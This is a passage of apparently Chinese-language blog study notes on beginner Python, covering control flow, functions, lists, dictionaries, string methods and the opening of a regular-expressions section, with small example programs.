href="#0x02-控制流" class="headerlink" title="0x02    控制流"></a>0x02    控制流</h1><p><strong>布尔值</strong></p><p>布尔值只有两种,<code>True</code> 和<code>False</code>.这两个值不能作为变量名,因为这属于保留关键字</p><p><strong>比较操作符</strong></p><p>比较两个值,返回的值为布尔值</p><table><thead><tr><th>==</th><th>等于</th></tr></thead><tbody><tr><td>!=</td><td>不等于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;=</td><td>小于等于</td></tr><tr><td>&gt;=</td><td>大于等于</td></tr></tbody></table><p><code>==</code> 和<code>!=</code> 适用于所有的数据类型,整数和浮点型的值永远不会和字符串类型相等</p><p><strong>布尔操作符</strong></p><p><code>and</code> 和 <code>or</code>  操作符只接受两个布尔值(或表达式),被认为是”二元”操作符</p><p><code>and</code>操作符有假(False)则假,<code>or</code>操作符有真(True)则真</p><p><strong>not 操作符</strong></p><p>not 操作符只作用于一个布尔值(或表达式),求的<strong>值为相反的布尔值</strong></p><p><strong>混合布尔和比较操作符</strong></p><p>计算机先求 左边的表达式的值,然后再求右边的</p><p>布尔操作符的优先级<code>not</code> , <code>and</code> ,<code>or</code> 从左到右优先级递减</p><p><strong>条件</strong></p><p>布尔表达式可以看成是条件,求值总为布尔值.</p><p><strong>代码块</strong></p><ol><li>缩进增加时，代码块开始</li><li>代码块可以包含其他代码块</li><li>缩进减少为零，或减少为外面包围代码块的缩进，代码块就结束了</li></ol><hr><p><code>if</code>语句</p><p>if语句的子句,语句的条件为True时执行,为False,子句跳过</p><p>if语句包含,if关键字,条件,冒号<code>:</code>,在下一行开始,缩进的代码块(if子句)</p><p><code>else</code>语句</p><p>if 子句后面可以跟着 else语句,只有if 语句的条件为<code>False</code>时, else子句才会执行</p><p>else 语句包含, else 关键字, 冒号<code>:</code> ,下一行的开始,缩进的代码块(称为 else子句)</p><p><code>elif</code> 语句</p><p>elif 语句是”否则如果” ,总数跟着 if 或另一条elif语句后面.只有当<strong>前面的条件</strong>为<code>False</code>时才检查该条件</p><p>elif 语句包含以下部分,elif 关键字,条件(布尔表达式),冒号<code>:</code>,在下一行开始,缩进的代码块</p><p>还可以在elif 语句后加 else 子句,<strong>当 if  elif 语句中的条件都会False,就执行else子句</strong></p><p><code>while</code> 循环语句</p><p>如果条件为True,那么 while 语句就会一直执行.while 语句总包含</p><ul><li>关键字</li><li>条件(布尔表达式)</li><li>冒号<code>:</code></li><li>从新行开始,缩进的代码块(while 子句)</li></ul><p><code>break</code> 语句,使用 break 语句来跳出 while 循环</p><p><code>continue</code> 语句, 用于循环内部,如果程序执行遇到 continue 语句,则跳回到 循环开始出,重新对循环条件求值</p><p>如果执行了无限循环,那么可以使用<code>Ctrl+C</code> 向程序发送一个KeyboardInterrupt错误,导致即可停止</p><p><strong>for 循环 和 range()函数</strong></p><p>让代码执行固定次数,就可以使用上面二者来实现</p><p>“类真” 和 “类假” 的值</p><p><code>0</code> <code>0.0</code> 和<code>&#39;&#39;</code>(空字符串) 被认为是<code>False</code>,其他值则是<code>True</code></p><p>for 语句</p><ul><li>for 关键字</li><li>一个变量名,一般设置为i</li><li>in 关键字</li><li>调用 range()方法,最大传入3个参数</li><li>冒号<code>:</code></li><li>从下一行开始,缩进的代码块(称为for子句)</li></ul><p><code>range()</code>函数的第三个参数代表步长,即每两个数之间的间隔.也可以用负数,让循环技术逐渐减少</p><p><strong>导入模块</strong></p><p>Python 程序可以调用一组基本的函数,称为”内建函数”.比如: input(),print(),len()等.Python 也包括一组模块,称为”标准库”每个模块都是一个Python 程序,包含一组相关的函数,可以直接嵌入程序之中.</p><p>使用 <code>import</code> 语句 导入模块</p><ul><li>import 关键字</li><li>模块的名称</li><li>可选的更多模块名称,用逗号隔开</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>因为<code>randint()</code>函数是<code>random</code>模块中的,所有必须在<code>randint</code>前面加上<code>random.</code>前缀,告诉Python 在random模块中寻找这个函数</p><p><strong>from import 语句</strong></p><ul><li>from 关键字,后面 是模块名称</li><li>import 关键字, 和一个<code>*</code> 星号</li></ul><p>使用这种import 语句,就不需要在使用模块中的函数时,在函数前面加上<code>模块名称.</code>的前缀</p><p><strong>使用<code>sys.exit()</code> 提前结束程序</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Type exit to exit.'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token string">'exit'</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'u typed'</span> <span class="token operator">+</span> response <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span></code></pre><p>因为<code>sys.exit()</code>是在<code>sys</code>模块中,所以必须导入sys模块</p><p><code>abs()</code>函数返回数字的绝对值</p><h1 id="0x03-函数"><a href="#0x03-函数" class="headerlink" title="0x03    函数"></a>0x03    函数</h1><p>在Python 中,除了内建函数<code>print()</code>这些以外,用户还可以自己定义函数,使用<code>def</code>来定义函数</p><p><strong><code>def</code>语句和参数</strong></p><p>在函数的括号里面的值就叫做参数.</p><pre class=" language-Python"><code class="language-Python">def hello(name):    print('hello ' + name)hello('aa')hello('bb')</code></pre><p>自定义的函数hello中,name就是<code>变元</code>,变元是一个变量,当函数被调用时,参数就存放在其中.<strong>保存在变元中的值,在函数返回后就丢失了.</strong></p><p><strong>返回值和 return 语句</strong></p><p><em>一般来说,函数调用求值的结果,就称为函数的”返回值”</em></p><p>用<code>def</code> 语句创建函数时, 可以用<code>return</code> 语句指定应该返回的值</p><p>return语句包含</p><ul><li>return 关键字</li><li>函数应该返回的值或表达式</li></ul><p>*<em>None 值 *</em></p><p>Python 中有个值称为<code>None</code>, 表示没有值. None 是NoneType 数据类型的唯一值(其他编程语言可能称这个值为null,nil或undefined)</p><p>如果<strong>只</strong>使用了 return关键字本身,就返回<code>None</code></p><p><strong>关键字参数和 print()</strong></p><p>比如在print()函数中,因为print()函数自动在传入的字符串末尾添加了换行符,但是可以通过添加<strong>关键字参数</strong>来改变他的返回值</p><p>比如</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'World'</span><span class="token punctuation">)</span></code></pre><p>的输出就是<code>HelloWorld</code> ,因为Hello后面不再打印换行,而是空字符串.如果不添加关键字参数(<code>end=&#39;&#39;</code>)就是换行后的结果.</p><p><code>sep=&#39;&#39;</code> 传入sep关键字,可以替换默认的分隔字符串</p><p><img src="https://i.loli.net/2020/02/05/EBolj1NTDnWmxwX.png" alt></p><p><strong>局部和全局作用域</strong></p><p>在<strong>被调用函数内赋值</strong>的变元和变量，处于该函数的“<strong>局部</strong>作用域”。在<strong>所有函数之外</strong>赋值的变量，属于“<strong>全局</strong>作用域”。处于局部作用域的变量，被称为“局部变量”。处于全局作用域的变量，被称为“全局变量”。一个变量必是其中一种，不能既是局部的又是全局的</p><p>可以将“作用域”看成是变量的容器。当作用域被销毁时，所有保存在该作用域内的变量的值就被丢弃了.</p><ul><li>全局作用域中的代码不能使用任何局部变量</li><li>局部作用域可以访问全局变量</li><li>局部作用域中代码不能使用其他局部作用域的变量</li><li>在不同的作用域中可以用相同的名字来命名变量</li></ul><pre class=" language-Python"><code class="language-Python">def spam():    eggs = 12312 #eggs  是函数spam()内的局部变量.当程序执行从spam返回后,该局部作用域就被销毁了spam()print(eggs)故报错为    print(eggs)NameError: name 'eggs' is not defined</code></pre><p><strong>global语句</strong></p><p>用<code>global</code>可以在函数内修改局部变量为全局变量</p><p>Python 中,错误可以通过<code>try</code>和<code>except</code>语句来处理,可能出错的语句就放入<code>try</code>子句中.如果错误发生,程序执行就转到接下来的<code>except</code>子句开始处.一旦执行了exceot子句的代码,就不会再回到try子句中,程序继续向下执行</p><pre class=" language-Python"><code class="language-Python">#This is a guess the number game.import randomsecretNum = random.randint(1,20)print('I am thinking of a number between 1 and 20.')#Ask the playe to guess 6 times.for guessesTaken in range(1,7):    print('take a guess.')    guess = int(input())    if guess < secretNum:        print('too low')    elif guess > secretNum:        print('too high')    else:        break # this condition is the correct guess.if guess == secretNum:    print('good job.u guessed my num in ' + str(guessesTaken) + 'guesses!')else:    print('Nope.The num  was thinking of was ' + str(secretNum))</code></pre><p>第三章项目实践</p><pre class=" language-PYTHON"><code class="language-PYTHON">#第三章项目实践import randomprint('Plese input a intxxx')def collatz(Num):    if Num % 2 == 0:# 表示 Num 为偶数        print(Num//2)    elif Num % 2 == 1:# 表示 Num 为奇数        print(3*Num + 1)#Ask user to type the Numtry:    Num = int(input())    collatz(Num)except:    print('ValueError.Must int.')</code></pre><h1 id="0x04-列表"><a href="#0x04-列表" class="headerlink" title="0x04    列表"></a>0x04    列表</h1><p><a href="https://blog.csdn.net/qq_36090423/article/details/88048556" target="_blank" rel="noopener">两个list列表元素 一一对应拼接</a></p><p>“列表” 是一个值, 包含多个字构成的序列.术语”列表值” 指的是列表本身,作为一个值,可保存给变量,而不是列表中的内容值.列表就是<code>[]</code>这个东西.里面的值称为”表项”,用逗号分隔.</p><p><code>[]</code>是一个空列表</p><p><strong>用下标取得列表中的单个值</strong></p><p>列表后面括号内的整数被称为”下标” ,列表中第一个值的下标是0,以此类推.下标只能是整数.</p><p>列表也能包含其他列表值,可以通过多重下标的方式来访问.有点像二维数组的味道.<strong>第一个下标表名使用哪个列表值,第二个下标表明该列表值中的值</strong></p><p>*<em>负数下标 *</em></p><p>整数值<code>-1</code> 指的是列表中的最后一个下标,<code>-2</code>指的是列表中倒数第二个下标,以此类推.</p><p><strong>利用切片取得字列表</strong></p><p>下标可以从列表中取得单个值,”切片”可以从列表中取得多个值,结果是一个新列表.就像这样<code>spam[1:4]</code></p><p>第一个整数是切片开始出的下标,第二个整数是切片结束处的下标.切片向上增长,直到第二个下标的值,但不包括.</p><p>作为快捷方法，可以省略切片中冒号两边的一个下标或两个下标。<strong>省略第一个下标相当于使用 0，或列表的开始。省略第二个下标相当于使用列表的长度，意味着分片直至列表的末尾</strong></p><p>使用<code>len()</code>来获取列表的长度</p><p>用下标还可以改变列表中的值,有点类似覆盖掉的意思</p><p><code>+</code>操作符可以连接两个列表.<code>*</code>操作符可以用来复制列表</p><p>可以使用<code>del</code>语句从列表中删除值,也可以作用于变量,删除它,作用就像是”取消赋值”的语句.但是几乎用不到删除变量</p><p><strong>in 和 not in 操作符</strong></p><p>利用<code>in</code>和<code>not in</code>操作符可以确定一个值是否在列表中.</p><p>用法是连接两个值,一个是要查找的值,一个是待查找的列表比如<code>&#39;web&#39; in CTF</code> </p><p><strong>多重赋值技巧</strong></p><p>即在一行代码中,利用列表中的值作为多个变量赋值</p><p><strong>增强的赋值操作</strong></p><table><thead><tr><th align="center">spam += 1</th><th>spam = spam + 1</th></tr></thead><tbody><tr><td align="center">spam -= 1</td><td>spam = spam -1</td></tr><tr><td align="center">spam *= 1</td><td>spam = spam * 1</td></tr><tr><td align="center">spam /= 1</td><td>spam = spam / 1</td></tr><tr><td align="center">spam % = 1</td><td>spam = spam %1</td></tr></tbody></table><p><code>+=</code>操作符可以完成字符串和列表的连接.<code>*=</code>操作符可以完成字符串和列表的复制</p><p>*<em>方法 *</em></p><p>方法就是函数,只是方法是调用在一个值上.</p><p>用<code>index()</code>方法在列表中查找值</p><pre><code>&gt;&gt;&gt; spam[&#39;misc&#39;, &#39;pwn&#39;, &#39;web&#39;, &#39;re&#39;, &#39;bin&#39;, &#39;misc&#39;, &#39;pwn&#39;, &#39;web&#39;, &#39;re&#39;, &#39;bin&#39;]&gt;&gt;&gt; spam.index(&#39;web&#39;)2ValueError: &#39;ddw&#39; is not in list</code></pre><p>如果这个值不在列表中,Python就会报<code>ValueError</code></p><p>如果列表中存在<strong>重复</strong>的值,就返回<strong>第一次</strong>出现的下标.</p><p>用<code>append()</code>和<code>insert()</code>方法在列表中添加值</p><p><code>append()</code>方法调用,将参数添加到列表末尾.</p><p><code>insert()</code>方法的第一个参数是新值的下标,第二个参数是要插入的新值</p><p>方法属于单个数据类型,<code>append()</code>和<code>insert()</code>方法是列表方法,只能在列表中调用,不能在其他值上调用.</p><p>用<code>remove()</code>方法从列表中删除值,如果删除的值出现多次,只删除第一次出现的值</p><p>如果知道下标,使用<code>del</code>语句</p><p>用<code>sort()</code>方法将列表中的值排序</p><pre><code>&gt;&gt;&gt; num[1, 2, 3, 5, 7, 8, 9, 123, 33, 12]&gt;&gt;&gt; num.sort()&gt;&gt;&gt; num[1, 2, 3, 5, 7, 8, 9, 12, 33, 123]</code></pre><p> 当指定<code>reverse</code>关键字参数为<code>True</code>时,可以让sort()按逆序排序</p><pre><code>&gt;&gt;&gt; num.sort(reverse=True)&gt;&gt;&gt; num[123, 33, 12, 9, 8, 7, 5, 3, 2, 1]</code></pre><p>不能对列表中同时有数字和字符串的列表进行排序,sort()进行排序时,使用的是<code>ASCII</code>字符顺序,而不是实际的字典顺序,就说明了大写字母排在小写字母之前</p><p>续行指令<code>\</code> ,即 这条指令在下一行继续的意思</p><p><strong>可变和不可变数据类型</strong></p><p>列表是可变数据,字符串是不可变的.而”改变”一个字符串的正确方式,是使用<strong>切片和连接</strong>.</p><p><strong>元组数据类型</strong></p><p>元组输入时用圆括号<code>()</code>,是不可变的.其他都很列表一样.</p><p>使用<code>list()</code>和<code>tuple()</code>函数来转换类型</p><p>这两个函数将返回 传递给它们的值的列表和元组版本</p><p><strong>引用</strong></p><p>变量可以直接引用他的值,但是列表赋值给变量,只是将列表的”引用”赋值给了这个变量.</p><p><strong>传递引用</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">eggs</span><span class="token punctuation">(</span>someParameter<span class="token punctuation">)</span><span class="token punctuation">:</span>    someParameter<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>spam <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>eggs<span class="token punctuation">(</span>spam<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>spam<span class="token punctuation">)</span></code></pre><p><strong>copy 模块 和 copy() 和 deepcopy()函数</strong></p><p><code>copy.copy()</code>函数用来赋值列表或者字典这样的<strong>可变值</strong>,而不是复制引用.</p><pre><code>&gt;&gt;&gt; import copy&gt;&gt;&gt; spam = [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;]&gt;&gt;&gt; spam[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]&gt;&gt;&gt; cheese = copy.copy(spam)&gt;&gt;&gt; cheese[0]=42&gt;&gt;&gt; spam[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]&gt;&gt;&gt; cheese[42, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]</code></pre><p><code>deepcopy()</code>函数将同时复制内部的列表</p><p>这两个函数的区别</p><p><a href="https://blog.csdn.net/u011630575/article/details/78604226" target="_blank" rel="noopener">https://blog.csdn.net/u011630575/article/details/78604226</a></p><blockquote><p>如果需要对一个变量中的列表修改，同时不修改原来的列表，就可以用 copy()或 deepcopy()。</p></blockquote><h1 id="0x05-字典和结构化数据"><a href="#0x05-字典和结构化数据" class="headerlink" title="0x05    字典和结构化数据"></a>0x05    字典和结构化数据</h1><p>字典的索引称为”键”,键及其关联的值称为”键-值”对.</p><p>字典就是<code>{}</code>这种带花括号的,和JSON格式类似</p><p>比如定义一个mybook字典,<code>mybook = {&#39;who&#39; : &#39;Dingins&#39;,&#39;where&#39; : &#39;England&#39;}</code></p><p>然后通过字典的键来访问字典,<code>mybook[&#39;who&#39;]</code> 返回的值就是<code>Dingins</code> ,当然也可以用整数值作为键,但是可以任何值作为第一个键,不一定是0</p><p>字典中的表项是不排序的,</p><p><code>keys()</code>,<code>values()</code>,<code>item()</code>方法对应返回字典的键,值,键-值对.返回的值可以用于for循环。<code>item()</code>方法返回的dict_items值,是包含键和值的元组.</p><p>如果想获得一个列表,就把返回的值传递给<code>list()</code>函数.同样的,也可以利用<code>in</code>和<code>not in</code>操作符检查值是否存在列表中.</p><p><code>get()</code>方法</p><p>有两个参数,要取得值的键,如果键不存在,返回备用的值</p><pre><code>&gt;&gt;&gt; mycat.get(&#39;flag&#39;,&#39;flag&#39;)#flag不存在字典中,故设置一个flag为备用&#39;flag&#39;&gt;&gt;&gt; mycat{&#39;size&#39;: &#39;fat&#39;, &#39;color&#39;: &#39;white&#39;, &#39;sex&#39;: &#39;boy&#39;}</code></pre><p><code>setdefault()</code>方法</p><p>当键没有任何值的时候使用的默认值.第一个参数为要检查的键,第二个参数是该键不存在时要设置的值.</p><p><strong>漂亮打印</strong></p><p>导入<code>pprint</code>模块,其中有<code>pprint()</code>函数,输出时每一个键值对都会换行</p><p><strong>嵌套的字典和列表</strong></p><p>顾名思义,不多做解释.</p><p>第五章项目实践</p><pre class=" language-python"><code class="language-python">have <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'rope'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'torch'</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'gold coin'</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token string">'dagger'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'arrow'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">displayInventory</span><span class="token punctuation">(</span>inventory<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Inventory:'</span><span class="token punctuation">)</span>    item_total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true"># 定义总数,刚开始为0</span>    <span class="token keyword">for</span> k <span class="token punctuation">,</span> v <span class="token keyword">in</span> inventory<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 利用 for 循环遍历字典中的值,键</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>        item_total <span class="token operator">+=</span> v    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Total number of items: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>item_total<span class="token punctuation">)</span><span class="token punctuation">)</span>displayInventory<span class="token punctuation">(</span>have<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 字典作为参数</span></code></pre><h1 id="0x06-字符串操作"><a href="#0x06-字符串操作" class="headerlink" title="0x06    字符串操作"></a>0x06    字符串操作</h1><blockquote><p>处理字符串</p></blockquote><p>可以使用<code>&quot;&quot;</code>双引号来使用字符串中的单引号,字符串从双引号开始,单引号只是字符串的一部分.</p><p><strong>转义字符</strong></p><p><code>\</code>紧跟着要添加到字符串中的字符.比如转义单引号<code>\&#39;</code>这样就可以在单引号中的字符串使用单引号</p><table><thead><tr><th align="center"><code>\&#39;</code></th><th>单引号</th></tr></thead><tbody><tr><td align="center"><code>\&quot;</code></td><td>双引号</td></tr><tr><td align="center"><code>\t</code></td><td>制表符</td></tr><tr><td align="center"><code>\n</code></td><td>换行符</td></tr><tr><td align="center"><code>\\</code></td><td>倒斜杠</td></tr></tbody></table><p><strong>原始字符串</strong></p><p>在字符串开始的引号之前加上<code>r</code>,就可以使该字符串成为原始字符串.<strong>原始字符串完全忽略所有的转义字符</strong></p><pre><code>&gt;&gt;&gt; print(r&#39;\ts\&#39;s&#39;)\ts\&#39;s</code></pre><p><strong>用三重引号的多行字符串</strong></p><p>“三重引号”之间的所有引号,制表符或换行都被认为是字符串的一部分</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''Dear Alice,eve's cat has beenSincerely,Bob'''</span><span class="token punctuation">)</span></code></pre><p>输出如下</p><pre><code>Dear Alice,eve&#39;s cat hasbennSincerely,Bob</code></pre><p><strong>多行注释</strong></p><p><code>#</code> 是一行注释,多行注释使用三个双引号<code>&quot;&quot;&quot; test</code></p><p><strong>字符串下标和切片</strong></p><p>字符串像列表一样,使用下标和切片.</p><p>空格和其他符合也会被计数</p><pre><code># 下标操作&gt;&gt;&gt; spam = &#39;Hello world!&#39;&gt;&gt;&gt; spam[0]&#39;H&#39;&gt;&gt;&gt; spam[5]&#39; &#39; # 这是空格# 切片操作&gt;&gt;&gt; fizz = spam[:3]&gt;&gt;&gt; fizz&#39;Hel&#39;</code></pre><p><strong>字符串的 in 和 not in 操作符</strong></p><p>用 in 或 not in 连接两个字符串得到的表达式，将求值为布尔值 True 或 False</p><p><strong>字符串方法upper(),lower(),isupper()和islower()</strong></p><p>upper()和 lower()字符串方法返回一个新字符串，其中原字符串的所有字母都被相应地转换为大写或小写。字符串中非字母字符保持不变</p><p>这些方法都不改变字符串本身,只是返回一个新字符串.如果要改变字符串本身,可以将这个返回值赋给原来的变量</p><p>如果字符串至少有一个字母，并且所有字母都是大写或小写，isupper()和islower()方法就会相应地返回布尔值 True。否则，该方法返回 False</p><p><strong>isX 字符串方法</strong></p><p>这些方法都是返回一个布尔值,描述了字符串的特点.</p><ul><li>isalpha()返回 True，如果字符串只包含字母，并且非空； </li><li>isalnum()返回 True，如果字符串只包含字母和数字，并且非空；</li><li>isdecimal()返回 True，如果字符串只包含数字字符，并且非空；</li><li>isspace()返回 True，如果字符串只包含空格、制表符和换行，并且非空；</li><li>istitle()返回 True，如果字符串仅包含以大写字母开头、后面都是小写字母的单词。</li></ul><p><strong>字符串方法 <code>startswith()</code> 和 <code>endswith()</code></strong></p><p>startswith()和 endswith()方法返回 True，如果它们所调用的字符串以该方法传入的字符串开始或结束.否则，方法返回 False</p><p><strong>字符串方法 <code>join()</code> 和<code>split()</code></strong></p><p><code>join()</code>方法用于连接字符串列表.join()方法在一个字符串上调用，参数是一个字符串列表，返回一个字符串,<strong>返回的字符串由传入的列表中每个字符串连接而成</strong></p><p>调用 join()方法的字符串，被插入到列表参数中每个字符串的<strong>中间</strong></p><pre><code>&gt;&gt;&gt; &#39;-&#39;.join([&#39;hello&#39;,&#39;hi&#39;,&#39;nihao&#39;])&#39;hello-hi-nihao&#39;</code></pre><p>split()方法做的事情正好相反：它<strong>针对一个字符串调</strong></p><p><strong>用，返回一个字符串列表</strong></p><pre><code>&gt;&gt;&gt; &#39;My name is baba&#39;.split()[&#39;My&#39;, &#39;name&#39;, &#39;is&#39;, &#39;baba&#39;]</code></pre><p>可以向 split()方法传入一个分割字符串，指定它按照不同的字符串分割</p><pre><code>&gt;&gt;&gt; &#39;Myabcisabcbaba&#39;.split(&#39;abc&#39;)[&#39;My&#39;, &#39;is&#39;, &#39;baba&#39;]</code></pre><p><code>split()</code>最常用的是传入<code>\n</code>按照换行符分隔多行字符串</p><p><strong><code>rjust(),ljust(),center()</code>方法对齐文本</strong></p><p>rjust()和 ljust()字符串方法返回调用它们的字符串的填充版本，通过插入空格来对齐文本。这两个方法的第一个参数是一个整数长度，用于对齐字符串,第二个可选参数将指定一个填充字符，取代空格字符</p><pre><code>&gt;&gt;&gt; &#39;hello&#39;.rjust(10)&#39;     hello&#39;</code></pre><p><code>rjust()</code>是右对齐,故在右边加上5个空格</p><pre><code>&gt;&gt;&gt; &#39;there is no flag&#39;.ljust(20,&#39;*&#39;)&#39;there is no flag****&#39;</code></pre><p><code>center()</code>方法让文本居中</p><pre><code>&gt;&gt;&gt; &#39;there is no flag&#39;.center(30,&#39;*&#39;)&#39;*******there is no flag*******&#39;</code></pre><p><strong>用 strip()、rstrip()和 lstrip()删除空白字符</strong></p><p>strip()字符串方法将返回一个新的字符串，它的开头或末尾都没有空白字符.lstrip()和 rstrip()方法将相应删除左边或右边的空白字符.</p><pre><code>&gt;&gt;&gt; t.rstrip()&#39;  t q l&#39;&gt;&gt;&gt; t.lstrip()&#39;t q l  &#39; </code></pre><p><strong>用 pyperclip 模块拷贝粘贴字符串</strong></p><p><code>pyperclip</code>模块有<code>copy()</code>和<code>paste()</code>可以向计算机的剪贴板发送文本，或从它接收文本</p><pre><code>&gt;&gt;&gt; import pyperclip&gt;&gt;&gt; pyperclip.copy(&#39;Hello world!&#39;)&gt;&gt;&gt; pyperclip.paste()&#39;Hello world!&#39;</code></pre><p>如果在Pystorm中使用的话,执行代码后 Ctrl+v 后的结果是一样的</p><p>交互式环境也就是<code>IDLE</code>,<code>#TODO:</code>TODO注释是提醒,要完成的部分程序.</p><p>第六章项目之一</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pypercliptext <span class="token operator">=</span> pyperclip<span class="token punctuation">.</span>paste<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># TODO: separate lines and add stars.</span>lines <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>lines<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># loop</span>    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'* '</span> <span class="token operator">+</span> lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># add stars to each string</span>text <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>pyperclip<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></code></pre><p>lines 列表现在包含修改过的行，每行都以星号开始。但 pyperclip.copy()需要一个字符串，而不是字符串的列表。要得到这个字符串，就要将 lines 传递给 join 方法</p><h1 id="第二部分-自动化任务"><a href="#第二部分-自动化任务" class="headerlink" title="第二部分: 自动化任务"></a>第二部分: 自动化任务</h1><h1 id="0x07-模式匹配与正则表达式-是重点"><a href="#0x07-模式匹配与正则表达式-是重点" class="headerlink" title="0x07    模式匹配与正则表达式(是重点!)"></a>0x07    模式匹配与正则表达式(是重点!)</h1><p>正则表达式，简称为 regex，是文本模式的描述方法</p><p>Python 中所有的正则表达式的函数都在<code>re</code>模块中</p><p><code>import re</code> 导入re模块</p><p>向 re.compile()传入一个字符串值，表示正则表达式，它将返回一个 Regex 模式对象（或者就简称为 Regex 对象）</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> re<span class="token operator">>></span><span class="token operator">></span> phoneNunRegex <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\d\d\d-\d\d\d-\d\d\d\d'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> mo <span class="token operator">=</span> phoneNunRegex<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'My number is 415-666-6666.'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Phone number found: '</span> <span class="token operator">+</span> mo<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Phone number found<span class="token punctuation">:</span> <span class="token number">415</span><span class="token operator">-</span><span class="token number">666</span><span class="token operator">-</span><span class="token number">6666</span></code></pre><p>变量名mo 是一个通用的名称,用于Match 对象.</p><p>注意,在Python 正则匹配中,在字符串前面使用<code>r</code>比用<code>\</code>转义字符更容易.</p><ol><li>import re 导入正则表达式模块</li><li>用re.compile()函数创建一个Regex 对象(使用原始字符串)</li><li>向 Regex 对象的 search()方法传入想查找的字符串.它返回一个 Match 对象</li><li>调用 Match 对象的 group()方法，返回实际匹配文本的字符串</li></ol><p><strong>用括号分组,每一个括号表示一组</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> re<span class="token operator">>></span><span class="token operator">></span> phoneNumRegex <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'(\d\d\d)-(\d\d\d)-(\d\d\d\d)'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> mo <span class="token operator">=</span> phoneNumRegex<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'My number is 123-456-7890.'</span><span class="token punctuation">)</span><span class="token 